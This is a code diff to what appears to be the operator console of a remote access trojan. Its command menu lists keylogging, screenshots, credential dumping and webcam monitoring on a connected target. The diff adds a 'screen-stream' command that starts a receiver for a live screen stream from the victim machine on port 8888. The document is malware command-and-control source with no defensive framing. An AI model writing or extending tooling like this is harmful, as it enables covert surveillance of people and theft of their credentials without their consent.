@@ -239,6 +239,18 @@ def webcam(target_ip):
             
     except Exception as e:
         print(f"[-] Failed to trigger task: {e}")
+
+def screen_stream():
+    print("[*] Starting screen stream receiver...")
+    print("[*] Listening for incoming DXGI screen stream on port 8888...")
+    try:
+        subprocess.run([sys.executable, "screen_receiver.py"])
+    except FileNotFoundError:
+        print("[-] screen_receiver.py not found in current directory")
+    except KeyboardInterrupt:
+        print("\n[*] Screen stream receiver stopped")
+    except Exception as e:
+        print(f"[-] Error starting screen receiver: {e}")
         
 
 def cli():
@@ -255,7 +267,8 @@ def cli():
         key-logger     To be determined
         screen-shot    Take screenshot
         dump           Credentials dump
-        webcam         Monitor the webcam on target 
+        webcam         Monitor the webcam on target
+        screen-stream  Receive DXGI screen stream from target
         exit, q        Exit the console
     """
     print("[*] Type help or h to see all commands...\n")
@@ -317,6 +330,9 @@ def cli():
                 print("[-] No target connected. Use 'listen' first.")
             else:
                 webcam(current_target)
+        
+        elif cmd == "screen-stream":
+            screen_stream()
 
         elif cmd == "":
             continue
